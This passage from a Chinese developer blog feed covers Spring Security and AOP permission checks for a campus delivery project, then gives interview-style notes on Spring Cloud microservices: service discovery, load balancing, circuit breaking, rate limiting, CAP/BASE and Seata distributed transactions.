<code>pom.xml</code> 中引入 Spring Security 依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>配置 Security</strong>：创建一个配置类 <code>WebSecurityConfig</code>，继承 <code>WebSecurityConfigurerAdapter</code>，并重写 <code>configure</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@EnableWebSecurity</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        http<br>            .authorizeRequests()<br>                .antMatchers(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;/home&quot;</span>, <span class="hljs-string">&quot;/login&quot;</span>).permitAll() <span class="hljs-comment">// 允许访问的路径</span><br>                .anyRequest().authenticated() <span class="hljs-comment">// 其他请求需要认证</span><br>                .and()<br>            .formLogin()<br>                .loginPage(<span class="hljs-string">&quot;/login&quot;</span>).permitAll() <span class="hljs-comment">// 自定义登录页面</span><br>                .and()<br>            .logout().permitAll(); <span class="hljs-comment">// 允许注销</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>用户认证</strong>：通过 <code>UserDetailsService</code> 加载用户信息，并使用 <code>PasswordEncoder</code> 对密码进行加密。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureGlobal</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    auth.userDetailsService(userDetailsService).passwordEncoder(passwordEncoder());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-使用-AOP-进行功能权限校验"><a href="#2-使用-AOP-进行功能权限校验" class="headerlink" title="(2) 使用 AOP 进行功能权限校验"></a><strong>(2) 使用 AOP 进行功能权限校验</strong></h4><p>对于更细粒度的权限控制，可以使用 AOP 结合自定义注解来实现。</p><ul><li><p><strong>自定义注解</strong>：创建一个注解 <code>@ValidatePermission</code>，用于标记需要权限校验的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Target(ElementType.METHOD)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> ValidatePermission &#123;<br>    String <span class="hljs-title function_">value</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>AOP 切面类</strong>：创建一个切面类 <code>PermissionAspect</code>，拦截带有 <code>@ValidatePermission</code> 注解的方法，并进行权限校验。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Aspect</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermissionAspect</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> SysUserRolePermService sysUserRolePermService;<br><br>    <span class="hljs-meta">@Before(&quot;@annotation(validatePermission)&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkPermission</span><span class="hljs-params">(JoinPoint joinPoint, ValidatePermission validatePermission)</span> &#123;<br>        <span class="hljs-comment">// 获取方法参数</span><br>        Object[] args = joinPoint.getArgs();<br>        <span class="hljs-comment">// 获取方法签名</span><br>        <span class="hljs-type">MethodSignature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> (MethodSignature) joinPoint.getSignature();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> signature.getMethod();<br>        <span class="hljs-comment">// 校验权限</span><br>        <span class="hljs-keyword">if</span> (!sysUserRolePermService.hasPermission(validatePermission.value())) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AccessDeniedException</span>(<span class="hljs-string">&quot;您无权操作！&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>使用注解</strong>：在需要校验权限的方法上添加 <code>@ValidatePermission</code> 注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/updateOrder&quot;)</span><br><span class="hljs-meta">@ValidatePermission(&quot;UPDATE_ORDER&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> &#123;<br>    <span class="hljs-comment">// 更新订单逻辑</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="3-数据安全标记与访问控制"><a href="#3-数据安全标记与访问控制" class="headerlink" title="(3) 数据安全标记与访问控制"></a><strong>(3) 数据安全标记与访问控制</strong></h4><p>对于数据级别的安全控制，可以采用数据安全标记和强制访问控制策略。</p><ul><li><p><strong>数据安全标记</strong>：对数据资源进行分类和分级标记，存储在数据库中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSecurityLabel</span> &#123;<br>    <span class="hljs-keyword">private</span> String resourceName;<br>    <span class="hljs-keyword">private</span> String category;<br>    <span class="hljs-keyword">private</span> String level;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>强制访问控制</strong>：在业务逻辑中，根据用户的角色和权限，判断其是否可以访问特定数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasDataAccess</span><span class="hljs-params">(String userId, String resourceId)</span> &#123;<br>    <span class="hljs-comment">// 查询用户角色和权限</span><br>    List&lt;String&gt; userPermissions = getUserPermissions(userId);<br>    <span class="hljs-comment">// 查询数据资源的安全标记</span><br>    <span class="hljs-type">DataSecurityLabel</span> <span class="hljs-variable">label</span> <span class="hljs-operator">=</span> getDataSecurityLabel(resourceId);<br>    <span class="hljs-comment">// 判断用户是否有权限访问该数据</span><br>    <span class="hljs-keyword">return</span> userPermissions.contains(label.getCategory()) &amp;&amp; userPermissions.contains(label.getLevel());<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a><strong>3. 总结</strong></h3><p>在 <strong>校园闪送</strong> 项目中，通过以下方法实现了数据安全与权限校验：</p><ol><li>使用 <strong>Spring Security</strong> 配置全局安全策略，保护用户数据和操作权限。</li><li>使用 <strong>AOP</strong> 和自定义注解实现细粒度的功能权限校验。</li><li>通过数据安全标记和强制访问控制策略，实现数据级别的安全控制。</li></ol><hr><h2 id="潜在重点难点分析与解决方案"><a href="#潜在重点难点分析与解决方案" class="headerlink" title="潜在重点难点分析与解决方案"></a>潜在重点难点分析与解决方案</h2><h4 id="1-需求频繁变更与业务逻辑耦合"><a href="#1-需求频繁变更与业务逻辑耦合" class="headerlink" title="1. 需求频繁变更与业务逻辑耦合"></a><strong>1. 需求频繁变更与业务逻辑耦合</strong></h4><ul><li><strong>难点</strong>：<br>餐饮业务需求多变（如促销活动、菜品分类调整），系统需快速响应调整，但代码耦合度高会导致修改成本剧增。  </li><li><strong>解决方案</strong>：  <ul><li><strong>领域驱动设计（DDD）</strong>：将核心业务（订单、库存、支付）抽象为独立领域模块，通过防腐层隔离外部依赖。  </li><li><strong>插件化架构</strong>：将促销、统计等功能设计为可插拔模块，通过配置文件动态加载。  </li><li><strong>契约测试</strong>：定义接口契约文档（如OpenAPI），确保前后端修改不影响已有功能。</li></ul></li></ul><hr><h4 id="2-多端协同与接口一致性"><a href="#2-多端协同与接口一致性" class="headerlink" title="2. 多端协同与接口一致性"></a><strong>2. 多端协同与接口一致性</strong></h4><ul><li><strong>难点</strong>：<br>管理端（Web）与用户端（微信小程序）需共享数据，但接口版本迭代可能导致兼容性问题。  </li><li><strong>解决方案</strong>：  <ul><li><strong>API版本控制</strong>：通过URL路径（如<code>/v1/order</code>）或请求头区分版本，旧版接口保留过渡期。  </li><li><strong>Mock服务</strong>：前端开发阶段使用Swagger+Postman Mock Server模拟接口响应，降低联调阻塞。  </li><li><strong>数据同步</strong>：采用Binlog监听MySQL变更，通过RabbitMQ广播事件，触发缓存更新或小程序端数据刷新。</li></ul></li></ul><hr><h4 id="3-支付与第三方服务集成"><a href="#3-支付与第三方服务集成" class="headerlink" title="3. 支付与第三方服务集成"></a><strong>3. 支付与第三方服务集成</strong></h4><ul><li><strong>难点</strong>：<br>微信支付回调的异步处理、网络超时、重复通知等场景易引发订单状态不一致。  </li><li><strong>解决方案</strong>：  <ul><li><strong>幂等性设计</strong>：支付回调接口通过<code>order_id</code>+<code>payment_id</code>唯一键避免重复处理。  </li><li><strong>补偿任务</strong>：定时扫描“支付中”状态的订单，主动查询微信支付结果（通过<code>out_trade_no</code>）。  </li><li><strong>熔断降级</strong>：集成Sentinel，在支付服务不可用时降级为“货到付款”模式，保障核心流程可用。</li></ul></li></ul><hr><h4 id="4-分布式环境下的数据一致性"><a href="#4-分布式环境下的数据一致性" class="headerlink" title="4. 分布式环境下的数据一致性"></a><strong>4. 分布式环境下的数据一致性</strong></h4><ul><li><strong>难点</strong>：<br>订单创建、库存扣减、支付回调可能跨服务调用，需保证最终一致性。  </li><li><strong>解决方案</strong>：  <ul><li><strong>Saga模式</strong>：将订单流程拆分为多个本地事务，通过事件驱动补偿机制（如库存不足时触发订单自动取消）。  </li><li><strong>本地消息表</strong>：在MySQL中记录事务日志，通过定时任务重试失败的消息（如库存扣减失败后回滚订单）。  </li><li><strong>分布式锁</strong>：使用Redis RedLock算法防止库存超卖（如秒杀场景）。</li></ul></li></ul><hr><h4 id="5-用户体验与性能优化"><a href="#5-用户体验与性能优化" class="headerlink" title="5. 用户体验与性能优化"></a><strong>5. 用户体验与性能优化</strong></h4><ul><li><strong>难点</strong>：<br>微信小程序首屏加载慢、管理端数据统计页面卡顿。  </li><li><strong>解决方案</strong>：  <ul><li><strong>小程序端</strong>：  <ul><li>图片懒加载+WebP格式压缩，减少首屏资源体积。  </li><li>使用<code>wx.setStorageSync</code>缓存静态数据（如菜品分类），减少HTTP请求。</li></ul></li><li><strong>管理端</strong>：  <ul><li>分页查询+虚拟滚动（如Ant Design Table）优化大数据量渲染。  </li><li>复杂统计查询预计算，结果存入Redis，每日定时更新。</li></ul></li></ul></li></ul><hr><h4 id="6-安全防护纵深不足"><a href="#6-安全防护纵深不足" class="headerlink" title="6. 安全防护纵深不足"></a><strong>6. 安全防护纵深不足</strong></h4><ul><li><strong>难点</strong>：<br>系统可能面临SQL注入、XSS攻击、越权访问等风险。  </li><li><strong>解决方案</strong>：  <ul><li><strong>输入校验</strong>：全局拦截器过滤特殊字符（如<code>&lt;script&gt;</code>），结合MyBatis参数化查询防SQL注入。  </li><li><strong>权限细粒度控制</strong>：基于RBAC模型，动态校验接口权限（如<code>@PreAuthorize(&quot;hasRole(&#39;ADMIN&#39;)&quot;)</code>）。  </li><li><strong>敏感数据脱敏</strong>：日志中屏蔽用户手机号（如<code>199****2959</code>），数据库字段加密存储（AES-GCM算法）。</li></ul></li></ul><hr><h4 id="7-运维与监控体系缺失"><a href="#7-运维与监控体系缺失" class="headerlink" title="7. 运维与监控体系缺失"></a><strong>7. 运维与监控体系缺失</strong></h4><ul><li><strong>难点</strong>：<br>线上问题定位困难，缺乏实时监控和预警机制。  </li><li><strong>解决方案</strong>：  <ul><li><strong>日志聚合</strong>：ELK（Elasticsearch+Logstash+Kibana）收集分析日志，关键操作标记TraceID。  </li><li><strong>链路追踪</strong>：集成SkyWalking监控接口耗时、数据库查询性能，定位慢调用链。  </li><li><strong>健康检查</strong>：Spring Boot Actuator暴露<code>/health</code>端点，配合Prometheus+Grafana监控JVM状态。</li></ul></li></ul><hr><h4 id="8-多环境部署与配置管理"><a href="#8-多环境部署与配置管理" class="headerlink" title="8. 多环境部署与配置管理"></a><strong>8. 多环境部署与配置管理</strong></h4><ul><li><strong>难点</strong>：<br>开发、测试、生产环境配置差异大，手动修改易出错。  </li><li><strong>解决方案</strong>：  <ul><li><strong>配置中心</strong>：使用Nacos统一管理环境变量，通过<code>spring.profiles.active</code>动态加载配置。  </li><li><strong>容器化部署</strong>：Docker+Jenkins Pipeline实现自动化构建，镜像区分环境标签（如<code>dev</code>&#x2F;<code>prod</code>）。  </li><li><strong>数据库版本控制</strong>：Liquibase管理SQL脚本变更，确保表结构一致性。</li></ul></li></ul><hr>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>微服务</title>
    <link href="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    <url>/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h1><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%80%83%E7%82%B9.png" title="微服务知识点"></p><h2 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h2><h3 id="Spring-Cloud5大组件"><a href="#Spring-Cloud5大组件" class="headerlink" title="Spring Cloud5大组件"></a>Spring Cloud5大组件</h3><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/SpringCloud%E4%BA%94%E5%A4%A7%E7%BB%84%E4%BB%B6.png" title="SpringCloud五大组件"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/SpringCloudAlibaba%E4%BA%94%E5%A4%A7%E7%BB%84%E4%BB%B6.png" title="SpringCloudAlibaba五大组件"></p><hr><h3 id="服务注册和发现是什么意思？Spring-Cloud如何实现服务注册发现？"><a href="#服务注册和发现是什么意思？Spring-Cloud如何实现服务注册发现？" class="headerlink" title="服务注册和发现是什么意思？Spring Cloud如何实现服务注册发现？"></a>服务注册和发现是什么意思？Spring Cloud如何实现服务注册发现？</h3><p>常见的注册中心：<font color="#F00">eureka、nacos</font>、zookeeper</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Eureka%E4%BD%9C%E7%94%A8.png" title="Eureka作用"></p><p><strong>服务注册</strong>：服务提供者需要把自己的信息注册到eureka，由eureka来保存这些信息，比如服务名称、ip、端口等等<br><br><strong>服务发现</strong>：消费者向eureka拉取服务列表信息，如果服务提供者有集群，则消费者会利用负载均衡算法，选择一个发起调用<br><br><strong>服务监控</strong>：服务提供者会每个30秒向eureka发送心跳，报告健康状态，如果eureka服务90秒没接收到心跳，从eureka剔除</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Nacos%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png" title="Nacos工作流程"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Nacos%E5%92%8Ceureka%E5%8C%BA%E5%88%AB.png" title="Nacos和eureka区别"></p><hr><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p><font color="#F00">Ribbon负载均衡流程</font></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Ribbon%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%B5%81%E7%A8%8B.png" title="Nacos工作流程"></p><p>Ribbon负载均衡策略有哪些？<br><br><font color="#F00">1、RoundRobinRule：简单轮询服务列表来选择服务器<br><br>2、WeightedResponseTimeRule:按照权重来选择服务器，响应时间越长，权重越小<br><br>3、RandomRule：随机选择一个可用的服务器<br><br></font><br>4、BestAvailableRule：忽略那些短路的服务器，并选择并发数较低的服务器<br><br>5、RetryRule：重试机制的选择逻辑<br><br>6、AvailabilityFilteringRule：可用性敏感策略，先过滤非健康的，再选择连接数较小的实例<br><br><font color="#F00">7、ZoneAvoidanceRule：以区域可用的服务器为基础进行服务器的选择。使用Zone对服务器进行分类，这个Zone可以理解为一个机房、一个机架等。而后再对Zone内的多个服务做轮询。</font><br></p><p>如果向自定义负载均衡策略如何实现？<br></p><p>可以自己创建类实现IRule接口，然后再通过配置类或者配置文件即可，通过定义IRule实现可以修改负载均衡规则，有两种方式：</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1.png" title="自定义负载均衡"></p><hr><h3 id="服务雪崩"><a href="#服务雪崩" class="headerlink" title="服务雪崩"></a>服务雪崩</h3><p>1、服务雪崩：一个服务失败，导致整条链路的服务都失败的情形<br><br>2、服务降级：服务自我保护的一种方式，或者保护下游服务的一种方式，用于确保服务不会受请求突增影响变得不可用，确保服务不会崩溃，<font color="#F00">一般在实际开发中于feigh接口整合，编写降级逻辑</font><br><br>3、服务熔断：默认关闭，需要手动打开。</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%9C%8D%E5%8A%A1%E9%9B%AA%E5%B4%A9.png" title="服务雪崩"></p><p><strong>服务降级</strong>：服务降级是服务自我保护的一种方式，或者保护下游服务的一种方式，用于确保服务不会受请求突增影响变得不可用，确保服务不会崩溃</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7.png" title="服务降级"></p><p>如果降级太多，则会触发<font color="#F00">熔断机制</font></p><p><font color="#F00">服务熔断</font><br><br>Hystrix熔断机制，用于监控微服务调用情况，默认是关闭的，如果需要开启需要在引导类上添加注解：<font color="#F00">@EnableCircuitBreaker&gt;</font>，如果检测<font color="#F00">到10秒内请求的失败了超过50%</font>，就触发熔断机制。<br>之后每隔5秒重新尝试请求微服务，如果微服务不能响应，继续走熔断机制。如果微服务可达，则关闭熔断机制，恢复正常请求<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%9C%8D%E5%8A%A1%E7%86%94%E6%96%AD.png" title="服务熔断"></p><hr><h3 id="服务监控"><a href="#服务监控" class="headerlink" title="服务监控"></a>服务监控</h3><p>服务监控能够实现问题定位、性能分析、服务关系和服务告警。</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%9C%8D%E5%8A%A1%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7.png" title="服务监控工具"></p><p><font color="#F00">skywalking</font><br><br>一个分布式系统的应用程序性能监控工具(Application Performance Managment)，提供了完善的链路追踪能力。</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E7%9B%91%E6%8E%A7%E7%BB%86%E8%8A%82.png" title="监控细节"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/skywalking%E8%BF%9B%E8%A1%8C%E7%9B%91%E6%8E%A7.png" title="skywalking监控"></p><hr><h2 id="业务相关"><a href="#业务相关" class="headerlink" title="业务相关"></a>业务相关</h2><h3 id="限流"><a href="#限流" class="headerlink" title="限流"></a>限流</h3><p>为什么要限流？<br><br>1、并发的的确大(突发流量)<br><br>2、放置用户恶意刷接口</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E9%99%90%E6%B5%81%E7%9A%84%E6%96%B9%E5%BC%8F.png" title="限流的方式"></p><p><font color="#F00">Nginx限流</font><br><br>控制速率(突发流量)</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%8E%A7%E5%88%B6%E9%80%9F%E7%8E%87.png" title="控制速率"></p><p>控制并发连接数</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%8E%A7%E5%88%B6%E5%B9%B6%E5%8F%91%E8%BF%9E%E6%8E%A5%E6%95%B0.png" title="控制并发连接数"></p><p><font color="#F00">网关限流</font><br></p><p>yml配置文件中，微服务路由设置添加局部过滤器RequestRateLimit<br><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E7%BD%91%E5%85%B3%E9%99%90%E6%B5%81.png" title="网关限流"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E4%B8%A4%E7%A7%8D%E4%B8%BB%E6%B5%81%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95.png" title="两种主流限流算法"></p><hr><h3 id="CAP和BASE"><a href="#CAP和BASE" class="headerlink" title="CAP和BASE"></a>CAP和BASE</h3><h4 id="CAP"><a href="#CAP" class="headerlink" title="CAP"></a>CAP</h4><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/CAP%E5%AE%9A%E7%90%86.png" title="CAP定理"></p><p><font color="#F00">CAP定理-Consistency</font><br><br>Consistency(一致性)：用户访问分布式系统中的任意节点，得到的数据必须一致<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/CAP%E4%B8%80%E8%87%B4%E6%80%A7.png" title="CAP一致性"></p><p><font color="#F00">CAP定理-Availability</font><br></p><p>Availability(可用性)：用户访问集群中的任意健康节点，必须能得到响应，而不是超时或拒绝<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/CAP%E5%8F%AF%E7%94%A8%E6%80%A7.png" title="CAP可用性"></p><p><font color="#F00">CAP定理-Partition tolerance</font><br></p><p>Partition(分区)：因为网络故障或其它原因导致分布式系统中的部分节点与其它节点失去连接，形成独立分区。<br><br>Tolerance(容错)：在集群出现分区时，整个系统也要持续对外提供服务</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/CAP%E5%88%86%E5%8C%BA%E5%AE%B9%E9%94%99.png" title="CAP分区容错"></p><p>结论：<br><br>1、分布式系统节点之间肯定是需要网络连接的，<font color="#F00">分区(P)是必然存在的</font><br><br>2、如果保证访问的高可用性(A)，可以持续对外提供服务，但不能保证数据的强一致性–&gt; <font color="#F00">AP</font><br><br>3、如果保证访问的数据强一致性(C)，就要放弃高可用性–&gt; <font color="#F00">CP</font></p><h4 id="BASE理论"><a href="#BASE理论" class="headerlink" title="BASE理论"></a>BASE理论</h4><p>BASE理论是对CAP的一种解决思路，包含三个思想：<br><br>1、**Basically Available(基本可用)<strong>：分布式系统在出现故障时，允许损失部分可用性，既保证核心可用。<br><br>2、</strong>Soft State(软状态)<strong>：在一定时间内，允许出现中间状态，比如临时的不一致状态。<br><br>3、</strong>Eventually Consistent(最终一致性)**：虽然无法保证强一致性，但是在软状态结束后，最终达到数据一致。</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/BASE%E7%90%86%E8%AE%BA.png" title="BASE理论"></p><p>解决分布式事务的思想和模型：<br><br>1、最终一致思想：各分支事务分别执行并提交，如果有不一致的情况，再想办法恢复数据(AP)<br><br>2、强一致思想：各分支事务执行完业务不要提交，等待彼此结果。而后统一提交或回滚(CP)</p><hr><h3 id="分布式事务解决方案"><a href="#分布式事务解决方案" class="headerlink" title="分布式事务解决方案"></a>分布式事务解决方案</h3><h4 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h4><p><font color="#F00">Seata架构</font></p><p>Seata事务管理中有三个重要的角色：<br><br>1、<strong>TC(Transaction Coordinator) - 事务协调者</strong> ：维护全局和分支事务的状态，协调全局事务提交或回滚。<br><br>2、<strong>TM(Transaction Manager) - 事务管理器</strong>：定义全局事务的范围、开始全局事务、提交或回滚全局事务。<br><br>3、<strong>RM(Resource Manager) - 资源管理器</strong>：管理分支事务处理的资源，与TC交谈以注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Seata.png" title="Seata"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Seata%E7%9A%84XA%E6%A8%A1%E5%BC%8F.png" title="Seata的XA模式"></p><p>Seata的XA模式，CP，需要互相等待各个分支事务提交，可以保证强一致性，性能差</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Seata%E7%9A%84AT%E6%A8%A1%E5%BC%8F.png" title="Seata的AT模式"></p><p>Seata的AT模式，AP，底层使用undo log实现，性能好</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/Seata%E7%9A%84TCC%E6%A8%A1%E5%BC%8F.png" title="Seata的TCC模式"></p><p>Seata的TCC模式，AP，性能较好，不过需要人工编码实现</p><h4 id="MQ分布式事务"><a href="#MQ分布式事务" class="headerlink" title="MQ分布式事务"></a>MQ分布式事务</h4><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/MQ%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1.png" title="MQ分布式事务"></p><p>MQ模式实现分布式事务，在A服务写数据的时候，需要在同一个事务内发送消息到另外一个事务，异步，性能最好<br></p><p>其中，XA模式和TCC模式适合银行业务，另外两个适合互联网业务</p><hr><h3 id="分布式服务的接口幂等性"><a href="#分布式服务的接口幂等性" class="headerlink" title="分布式服务的接口幂等性"></a>分布式服务的接口幂等性</h3><p>幂等：多次调用方法或者接口不会改变业务状态，<font color="#F00">可以保证重复调用的结果和单次调用的结果一致。</font></p><p>需要幂等场景：<br><br>1、用户重复点击(网络波动)<br><br>2、MQ消息重复<br><br>3、应用使用失败或超时重试机制<br></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E6%8E%A5%E5%8F%A3%E5%B9%82%E7%AD%89.png" title="接口幂等"></p><p>token+redis</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/token+redis.png" title="token+redis"></p><p>分布式锁</p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81.png" title="分布式锁"></p><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E5%B9%82%E7%AD%89%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E9%80%89%E6%8B%A9.png" title="幂等解决方法选择"></p><hr><h3 id="分布式任务调度"><a href="#分布式任务调度" class="headerlink" title="分布式任务调度"></a>分布式任务调度</h3><p>xxl-job解决的问题<br>1、解决集群任务的重复执行问题<br><br>2、cron表达式定义灵活<br><br>3、定时任务失败了，重试和统计<br><br>4、任务量大，分片执行<br></p><h4 id="xxl-job路由策略有哪些？"><a href="#xxl-job路由策略有哪些？" class="headerlink" title="xxl-job路由策略有哪些？"></a>xxl-job路由策略有哪些？</h4><p><img src="/2025/02/23/%E5%BE%AE%E6%9C%8D%E5%8A%A1/xxl-job%E8%B7%AF%E7%94%B1%E7%AD%96%E7%95%A5.png" 